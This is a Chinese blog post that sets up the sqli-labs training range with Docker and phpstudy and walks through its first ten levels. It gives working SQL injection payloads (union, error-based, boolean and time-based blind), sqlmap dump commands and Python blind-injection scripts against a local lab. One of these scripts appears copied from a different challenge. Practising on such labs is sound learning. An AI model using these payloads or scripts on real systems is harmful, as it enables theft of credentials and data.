---
title: sql靶场搭建和刷题
date: 2024-11-19 12:27:52
comments: true
description: 学习记录
categories:
- sql基础知识
tags:
- sql
- docker
- phpstudy
---
# sql靶场搭建和刷题

sql-labs靶场的搭建可以选择使用docker或者phpstudy，但是既然是大人了，那么两个我都要(

---
> 参考文章
>
> <https://blog.csdn.net/weixin_44355653/article/details/140267707>
> <https://blog.csdn.net/ZL_1618/article/details/132684977>
>
>参考视频
>
> <https://www.bilibili.com/video/BV1aS4y1W78p?p=2&vd_source=06887b49ed0996e8a27c4d84f89315d3>
---

## 一.使用docker搭建(折磨人第一步)

1.docker是基于Linux系统的软件，所以只有windows系统的我们需要一个linux系统

首先需要虚拟机VMware workstation pro，以及ubuntu系统的镜像，使用VM载入ubuntu系统并调试好它(这并不是本文重点所以这里不细讲过程)

2.右键ubuntu的桌面，点击在终端打开，先输入`su -`获得root权限避免之后莫名其妙的权限问题

3.检查并卸载老版本的docker

`sudo apt-get remove docker docker-engine docker.io containerd runc`

4.更新软件包

```
sudo apt-get update
sudo apt-get upgrade
```

5.安装必要依赖包

为了允许apt通过HTTPS使用仓库，需要安装几个依赖包：

`sudo apt install apt-transport-https ca-certificates curl software-properties-common -y`

6.添加docker镜像源

因为一些特殊原因，docker的相关官方链接在国内被墙，我们要使用阿里云的镜像源下载docker

添加docker GPG密钥(一种用于加密、解密和数字签名的密钥，它是基于公钥加密技术的一种实现,保证数据传输安全)

`curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/ubuntu/gpg | sudo gpg --dearmor -o /usr/share/keyrings/docker-archive-keyring.gpg`

添加阿里云的dockers apt仓库

`echo "deb [arch=$(dpkg --print-architecture) signed-by=/usr/share/keyrings/docker-archive-keyring.gpg] https://mirrors.aliyun.com/docker-ce/linux/ubuntu $(lsb_release -cs) stable" | sudo tee /etc/apt/sources.list.d/docker.list > /dev/null`

7.安装docker

因为上面设置了新的镜像源，要再更新一下软件包索引

`sudo apt update`

再安装

`sudo apt install docker-ce docker-ce-cli containerd.io -y`

8.验证docker是否正确安装(怎么可能一帆风顺)

`sudo docker run hello-world`

很好，当我们运行完这最后一个指令，应该会看到一条欢迎消息，表明docker安装成功

但是显示错误如下

```
Unable to find image 'hello-world:latest' locally
latest: Pulling from library/hello-world
c1ec31eb5944: Retrying in 10 seconds 
docker: error pulling image configuration: download failed after attempts=6: dial tcp 128.242.245.93:443: connect: connection refused.
See 'docker run --help'.
```

简单分析我们会发现又是跟网络有关(懂的都懂)，这下还是敢怒不敢言了

这里有两个方法解决：

(1)使用阿里云的容器镜像加速器

登录阿里云官网，搜索容器镜像服务，在左侧的栏里点击镜像工具，弹出镜像加速器，再点击它，就能看到你的加速器地址，根据它提示的操作文档去输入指令

![](https://www.helloimg.com/i/2024/11/19/673c5573556d3.png)

如果这个方法成功的话，那我就不会说第二个方法了

很显然我又没成功

(2)把大部分能够加速的镜像源都加上

```
sudo mkdir -p /etc/docker
sudo tee /etc/docker/daemon.json <<-'EOF'
{
    "registry-mirrors": [
        "https://do.nark.eu.org",
        "https://dc.j8.work",
        "https://docker.m.daocloud.io",
        "https://dockerproxy.com",
        "https://docker.mirrors.ustc.edu.cn",
        "https://docker.nju.edu.cn"
    ]
}
EOF
sudo systemctl daemon-reload
sudo systemctl restart docker
systemctl status docker
```

最后再次运行`docker run hello-world`,显示

```
Unable to find image 'hello-world:latest' locally
latest: Pulling from library/hello-world
c1ec31eb5944: Pull complete 
Digest: sha256:305243c734571da2d100c8c8b3c3167a098cab6049c9a5b066b6021a60fcb966
Status: Downloaded newer image for hello-world:latest

Hello from Docker!
This message shows that your installation appears to be working correctly.

To generate this message, Docker took the following steps:
 1. The Docker client contacted the Docker daemon.
 2. The Docker daemon pulled the "hello-world" image from the Docker Hub.
    (amd64)
 3. The Docker daemon created a new container from that image which runs the
    executable that produces the output you are currently reading.
 4. The Docker daemon streamed that output to the Docker client, which sent it
    to your terminal.

To try something more ambitious, you can run an Ubuntu container with:
 $ docker run -it ubuntu bash

Share images, automate workflows, and more with a free Docker ID:
 https://hub.docker.com/

For more examples and ideas, visit:
 https://docs.docker.com/get-started/
```

虽然好像还是出现了小问题不过那句`Hello from Docker!`出来了就不管了

9.查看是否成功拉取镜像

`docker images`

返回

```
REPOSITORY    TAG       IMAGE ID       CREATED         SIZE
hello-world   latest    d2c94e258dcb   18 months ago   13.3kB
```

显示这些，说明我的docker安装大功告成了

10.安装sqli-labs-master

理论上，先搜索sqllabs(需科学上网)，在命令行输入`docker search sqli-labs`

然后它会给你一大串列表，列出可下载的源，stars最多的是acgpiano/sqli-labs

输入`docker pull acgpiano/sqli-labs`

就会开始下载，但是因为奇奇怪怪的网络原因(懂的都懂)，我始终无法下载成功，在查询大量资料和询问ai后无果

又局限于我个人水平，知识储备不足，我无法解决这个问题

遂放弃docker搭建sqllabs的方案

## 二.使用phpstudy搭建

1.去官网下载[phpstudy](https://www.xp.cn/php-study)

2.解压缩后打开文件夹双击phpstudy_x64_8.1.1.3.exe，安装

3.启动软件，在首页启动Apache和Mysql

4.点击左边栏的网站，查看你的localhost是否状态正常

5.点击数据库，看看用户密码

6.点击设置，点击文件设置，进入Mysql文件夹，进入bin文件夹，shift+右键在空白处打开powershell

输入`.\mysql.exe -u root -p`,提示输入密码，把你看到的数据库密码输入

若出现类似

```
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 3
Server version: 5.7.26 MySQL Community Server (GPL)

Copyright (c) 2000, 2019, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
```

说明Mysql安装成功

7.sqli-labs-master的安装

去GitHub下载[sqllabs](https://github.com/Audi-1/sqli-labs)的压缩包，解压缩到phpstudy_pro的WWW目录下

![](https://www.helloimg.com/i/2024/11/20/673d46c8f23a3.png)

打开sqli-labs-master下的sql-connections

编辑其中的db-creds.ins文件，把`$dbpass=''`的引号里面输入你的数据库密码，保存

8.打开浏览器，在地址栏输入localhost:端口号/sqli-labs-master/ 回车

![](https://i-blog.csdnimg.cn/blog_migrate/586b25e4fec3984766b5f52129d913e2.png)

即安装成功

## 三.sqlilabs通关记录

### 第一关

Please input the ID as parameter with numeric value

`?id=1`

返回

```
Your Login name:Dumb
Your Password:Dumb
```

注入

`?id=1 and 1=1 跟?id=1 and 1=2`

都没有报错，说明是字符型注入

那就尝试拼接字符串?id=1' and '1'='1

返回

```
Your Login name:Dumb
Your Password:Dumb
```

说明大体方向没错，那就可以去尝试确定表单的列数

`?id=1' and '1'='1' order by 3--+`

在尝试到4的时候，页面开始报错，说明列数为3，再看看回显位

`?id=-1' union select 1,2,3--+`

![QQ截图20241124192755.png](https://www.helloimg.com/i/2024/11/24/67430ca82cd42.png)

2,3列为回显位

剩下就可以把它开盒了

`?id=-1' union select 1,database(),version()--+`看看数据库名字和sql版本

![QQ截图20241124203010.png](https://www.helloimg.com/i/2024/11/24/67431b4376122.png)

输入

`?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+`

将返回security下的所有表单名字，猜测所有账号密码应该在users里面

![](https://img2020.cnblogs.com/blog/2075370/202010/2075370-20201001191039433-1928732598.png)

输入

`?id=-1' union select 1,2,group_concat(column_name)from information_schema.columns where table_name='users'--+`

返回users表单的所有列名id,password,username

输入

`?id=-1' union select 1,2,group_concat(0x5c,username,0x5c,password) from users--+`

其中0x5c是`\`的十六进制表示，以隔开不同数据防止混淆

![QQ截图20241124203313.png](https://www.helloimg.com/i/2024/11/24/67431bfb088e9.png)

事实上，我们使用SQLmap高效爆破

去[SQLmap官网](https://sqlmap.org/)下载软件包

解压后在文件夹里面启动cmd，输入含有注入点的URL，比如

`sqlmap.py -u "http://sqli-labs-master:8848/Less-1/?id=1'" --dbs`

它询问什么就全输入y

--dbs:是查看所有的数据库

--tables:是查看所有的表

--columns:是查看表中所有的字段名

--dump:是查询哪个表的数据

![QQ截图20241124205024.png](https://www.helloimg.com/i/2024/11/24/67431ffcda494.png)

看看security库的表单

`sqlmap.py -u "http://sqli-labs-master:8848/Less-1/?id=1'" -D security --tables`

![QQ截图20241124205241.png](https://www.helloimg.com/i/2024/11/24/674320887b1e4.png)

再爆它的列头名

`sqlmap.py -u "http://sqli-labs-master:8848/Less-1/?id=1'" -D security -T users --columns`

![QQ截图20241124205414.png](https://www.helloimg.com/i/2024/11/24/674320ec5fcdd.png)

最后直接掀底裤了

`sqlmap.py -u "http://sqli-labs-master:8848/Less-1/?id=1'" -D security -T users -C "id,username,password" --dump`

![QQ截图20241124205740.png](https://www.helloimg.com/i/2024/11/24/674321bd06290.png)

### 第二关

判断一下是什么类型的注入

`?id=1`和`?id=2-1`都没有报错，是数值型注入

这就好办，因为是数值型注入，根本不需要闭合符，其余操作如同第一关

得到的数据库也跟上一关一模一样

### 第三关

判断注入类型

我尝试使用

`?id=1 and 1=1 跟?id=1 and 1=2`

返回一样的页面，是字符型

我又试了一下`?id=1'`，返回报错

`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'') LIMIT 0,1' at line 1`

这下不仅确定是字符型，还是以`')`为闭合符

```
?id=1') order by 3--+
?id=-1') union select 1,2,3--+
?id=-1') union select 1,database(),version()--+
?id=-1') union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
?id=-1') union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
?id=-1') union select 1,2,group_concat(username ,id , password) from users--+
```

### 第四关

判断

`?id=2'`

没报错，看不出什么闭合

`?id=2"`

返回`You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '"2"") LIMIT 0,1' at line 1`

闭合符`")`

后续如前几关

```
?id=1") order by 3--+
?id=-1") union select 1,2,3--+
?id=-1") union select 1,database(),version()--+
?id=-1") union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='security'--+
?id=-1") union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
?id=-1") union select 1,2,group_concat(username ,id , password) from users--+
```

### 第五关

判断

`?id=1'`

根据返回结果得为字符型注入，且`'`闭合,但是页面显示有些奇怪，始终是You are in

看看列数

`?id=1' order by 3--+`

看看回显位

`?id=-1' union select 1,2,3--+`

坏了不回显，那么UNION注入不能使用，我们要使用报错注入，这里使用extractvalue函数

`?id=1' and extractvalue(1,concat(0x7e,(select database()))) --+`

返回

`XPATH syntax error: '~security'`

继续爆表
```
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()))) --+
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='users'))) --+
?id=1' and extractvalue(1,concat(0x7e,(select group_concat(username ,id , password) from users))) --+
```

返回只有`XPATH syntax error: '~Dumb1Dumb,Angelina2I-kill-you,D'`,extractvalue和updatexml的报错返回会有32字符的长度限制，这严重影响我们的信息获取

所以我们可以使用substring延长，语法

`SUBSTRING(str, pos, len)`

str：源字符串

pos：开始位置（从1开始计数）

len：提取的字符数（可选）

`?id=1' and extractvalue(1,concat(0x7e,(select substring(group_concat(username ,id , password),25,30) from users))) --+`

从第25个字符往后再显示30个字符

返回

`XPATH syntax error: '~l-you,Dummy3p@ssword,secure4cr'`

### 第六关

判断后发现是`"`闭合，之后跟前面没什么区别

### 第七关

想判断类型，发现没有回显和报错，好吧，那就布尔盲注

使用`?id=1 AND 1=1`和`?id=1 AND 1=2`页面呈现两种状态，布尔可以用

接下来老生常谈

```
?id=1 and ascii(substr((select database()),1,1))>=100 --+
?id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>=100 --+
?id=1 and ascii(substr((select column_name from information_schema.columns where table_schema=database() limit 0,1),1,1))>=100 --+
?id=1 and ascii(substr((select username from users limit 0,1),1,1))>=100 --+
```

这里需要使用脚本以便高效处理

```python
#-*-coding:utf-8-*-
import requests
import time

host = "http://sqli-labs-master:8848/Less-7/"

def getDatabase():  #获取数据库名
    global host
    ans=''
    for i in range(1,1000):
        low = 32
        high = 128
        mid = (low+high)//2
        while low < high:
            payload= "1'^(ascii(substr((select(database())),%d,1))<%d)^1#" % (i,mid)
            param ={"username":payload,"password":"admin"}
            res = requests.post(host,data=param)
            if "用户名错误" in res.text:
                high = mid
            else:
                low = mid+1
            mid=(low+high)//2
        if mid <= 32 or mid >= 127:
            break
        ans += chr(mid-1)
        print("database is -> "+ans)

def getTable(): #获取表名
    global host
    ans=''
    for i in range(1,1000):
        low = 32
        high = 128
        mid = (low+high)//2
        while low < high:
            payload = "1'^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),%d,1))<%d)^1#" % (i, mid)
            param = {"username": payload, "password": "admin"}
            res = requests.post(host,data=param)
            if "用户名错误" in res.text:
                high = mid
            else:
                low = mid+1
            mid=(low+high)//2
        if mid <= 32 or mid >= 127:
            break
        ans += chr(mid-1)
        print("table is -> "+ans)

def getColumn(): #获取列名
    global host
    ans=''
    for i in range(1,1000):
        low = 32
        high = 128
        mid = (low+high)//2
        while low < high:
            payload = "1'^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='admin')),%d,1))<%d)^1#" % (
            i, mid)
            param = {"username": payload, "password": "admin"}
            res = requests.post(host, data=param)
            if "用户名错误" in res.text:
                high = mid
            else:
                low = mid+1
            mid=(low+high)//2
        if mid <= 32 or mid >= 127:
            break
        ans += chr(mid-1)
        print("column is -> "+ans)

def dumpTable():#脱裤
    global host
    ans=''
    for i in range(1,10000):
        low = 32
        high = 128
        mid = (low+high)//2
        while low < high:
            payload = "1'^(ascii(substr((select(group_concat(username,0x3a,password))from(admin)),%d,1))<%d)^1#" % (
                i, mid)
            param = {"username": payload, "password": "admin"}
            res = requests.post(host, data=param)
            if "用户名错误" in res.text:
                high = mid
            else:
                low = mid+1
            mid=(low+high)//2
        if mid <= 32 or mid >= 127:
            break
        ans += chr(mid-1)
        print("dumpTable is -> "+ans)

dumpTable()
```

### 第八关

还是布尔盲注，跟上面一样

### 第九关

不管怎么写它都不改变页面，可以试试时间盲注了

`?id=1' and sleep(3)--+`

F12打开看看响应时间花了3.12秒，说明是以`'`闭合的

接下来就是时间盲注试出所有信息了

```
?id=1' and if(ascii(substr(select database()),1,1)>100,sleep(0),sleep(3))--+
?id=1' and if(ascii(substr(select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)>100,sleep(0),sleep(3))--+
?id=1' and if(ascii(substr(select column_name from information_schema.columns where table_schema=database() limit 0,1),1,1)>100,sleep(0),sleep(3))--+
?id=1' and if(ascii(substr(select username from users limit 0,1),1,1)>100,sleep(0),sleep(3))--+
```

脚本执行

```python
import requests
import time

url = "http://sqli-labs-master:8848/Less-9/"
result = ""
for i in range(1,100):
    min_value = 33
    max_value = 130
    mid = (min_value+max_value)//2 #求取中值
    while(min_value<max_value):
        # payload ="?id=1' and (ascii(substr(database(),{0},1))>{1}) --+".format(i,mid)
        payload = "?id=1' and if(ascii(substr(user(),{0},1))>{1}, sleep(2),0) --+".format(i, mid)
        get_url = url + payload
        time1 = time.time()
        html = requests.get(get_url)
        time2 = time.time()
        get_url = ''
        #判断中间数值的位置，中间数在目标之上，最大区间点替换为中间数，中间数在目标数目之下，最小区间点替换为中间数
        time3 = time2 - time1
        if time3 > 2:
            min_value = mid+1
        else:
            max_value = mid
        # --- 每一次循环都会刷新这里的中间数值
        mid = (min_value+max_value)//2
    #找不到目标元素时停止(停止符号可能得微调)
    if(chr(mid)=="!"):
        break
    #将ACLL码转换为字符，叠加返回结果result
    result += chr(mid)
    print(result)
print("your result is:",result)
```

### 第十关

跟第九关一样，唯一的差别就是闭合符不同

---
先到这里，sql注入的基础内容算是学完了
